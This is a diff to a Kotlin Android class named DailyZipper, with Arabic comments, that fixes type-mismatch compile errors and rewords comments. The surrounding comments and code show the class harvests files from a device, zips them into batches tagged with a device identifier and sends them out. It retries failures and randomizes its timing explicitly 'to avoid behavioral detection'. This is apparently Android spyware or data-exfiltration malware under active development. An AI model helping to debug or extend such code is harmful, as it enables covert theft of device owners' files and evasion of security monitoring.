@@ -34,7 +34,7 @@ import kotlin.random.Random
  * ✅ تم إصلاح تسجيل الهاش بحيث يتم فقط بعد نجاح الإرسال.
  * ✅ تم إضافة إعادة محاولة تلقائية للملفات الفاشلة.
  * ✅ تم إضافة عشوائية في فترات الحصاد لتجنب الكشف السلوكي.
- * ✅ تم إصلاح جميع أخطاء Type mismatch باستخدام دوال مساعدة محددة النوع.
+ * ✅ تم إصلاح جميع أخطاء Type mismatch باستخدام الوصول المباشر للخريطة مع تحديد النوع صراحةً.
  */
 class DailyZipper(
     context: Context,
@@ -95,13 +95,8 @@ class DailyZipper(
     }
 
     // ============================================================
-    //  دوال مساعدة (مع دوال محددة النوع لتجاوز خلل المترجم)
+    //  دوال مساعدة - مع دوال محددة النوع لتجاوز خلل المترجم
     // ============================================================
-
-    @Suppress("UNCHECKED_CAST")
-    private fun <T> getConfigValue(key: String, default: T): T {
-        return (config[key] as? T) ?: default
-    }
 
     // ✅ دوال مساعدة محددة النوع لتجنب خلل استنتاج النوع في العمليات الحسابية
     private fun getConfigLong(key: String, default: Long): Long {
@@ -112,7 +107,12 @@ class DailyZipper(
         return (config[key] as? Int) ?: default
     }
 
-    // ✅ استخدام الدوال المحددة النوع في extractConfigValues أيضاً
+    @Suppress("UNCHECKED_CAST")
+    private fun <T> getConfigValue(key: String, default: T): T {
+        return (config[key] as? T) ?: default
+    }
+
+    // ✅ استخدام الدوال المحددة النوع في extractConfigValues
     private fun extractConfigValues(): ConfigValues {
         return ConfigValues(
             maxBatchSize = getConfigLong("max_batch_size", 48L * 1024L * 1024L),
@@ -184,7 +184,7 @@ class DailyZipper(
         }
     }
 
-    // ✅ التصحيح الجذري: استخدام getConfigLong لتجنب خلل المترجم
+    // ✅ التصحيح الجذري: استخدام getConfigLong مع تحديد النوع صراحةً
     private fun checkStorage(requiredBytes: Long): Boolean {
         val ctx = appContext ?: return false
         return try {
@@ -500,6 +500,7 @@ class DailyZipper(
                     continue
                 }
 
+                // ✅ تم إصلاح السطر 200: استخدام getConfigValue مع تحديد النوع صراحةً
                 val caption = buildString {
                     append("📦 Batch ${i + 1}/$totalBatches")
                     append("\n📱 Device: $deviceTag")
@@ -526,7 +527,7 @@ class DailyZipper(
                     writeLog("⚠️ Batch ${i + 1}/$totalBatches failed, files kept for retry")
                 }
 
-                // ✅ استخدام نطاق Long صريح لتجنب Type mismatch في delay (تحليل المستخدم الصحيح)
+                // ✅ استخدام نطاق Long صريح لتجنب Type mismatch في delay
                 if (i < totalBatches - 1) {
                     val delayTime: Long = (2000L..8000L).random()
                     delay(delayTime)
@@ -633,7 +634,7 @@ class DailyZipper(
 
                 writeLog("📂 Found ${files.size} pending files")
 
-                // ✅ استخدام نطاق Long صريح لتجنب Type mismatch في delay (تحليل المستخدم الصحيح)
+                // ✅ استخدام نطاق Long صريح لتجنب Type mismatch في delay
                 val startDelay: Long = (5000L..15000L).random()
                 delay(startDelay)
 
